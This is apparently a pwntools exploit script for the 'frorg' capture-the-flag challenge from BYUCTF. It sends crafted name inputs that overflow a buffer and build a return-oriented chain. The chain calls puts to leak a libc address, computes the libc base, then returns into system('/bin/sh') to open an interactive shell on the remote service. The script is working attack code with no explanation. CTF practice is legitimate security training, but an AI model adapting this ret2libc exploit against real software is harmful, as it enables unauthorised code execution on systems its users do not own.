#!/usr/bin/python3

from pwn import *

exe = ELF('frorg_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b*main+159
                b*main+132
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('byuctf.xyz', 40015)
else:
    p = process(exe.path)

GDB()

sla(b"store? \n", b"9")
for i in range(4):
    sa(b"name: \n", b"a" * 10)
payload = p64(0x0461616161) + b"aa"
sa(b"name: \n", payload)
sa(b"name: \n", b"\0" * 6 + p32(0x4011e5))

sa(b"name: \n", b"\0" * 4 + p32(0x404000) + b"\0\0")
sa(b"name: \n", b"\0" * 2 + p64(exe.plt['puts']))

sa(b"name: \n", p64(0x4011ea))
p.recvuntil(b"Thank you!\n")
libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("leak libc: " + hex(libc_leak))
libc.address = libc_leak - 510432
info("base libc: " + hex(libc.address))

sla(b"store? \n", b"9")
for i in range(4):
    sa(b"name: \n", b"a" * 10)
payload = p64(0x0461616161) + b"\0\0"
sa(b"name: \n", payload)
sa(b"name: \n", b"\0" * 6 + p32(0x4011e5))
binsh = next(libc.search(b'/bin/sh'))
part1 = (binsh & 0xffff)
part2 = binsh >> 16

sa(b"name: \n", b"\0" * 4 + p16(part1) + p32(part2))
sa(b"name: \n", b"\0\0" + p64(0x000000000040101a))
sa(b"name: \n", p64(libc.sym['system']))
p.interactive()
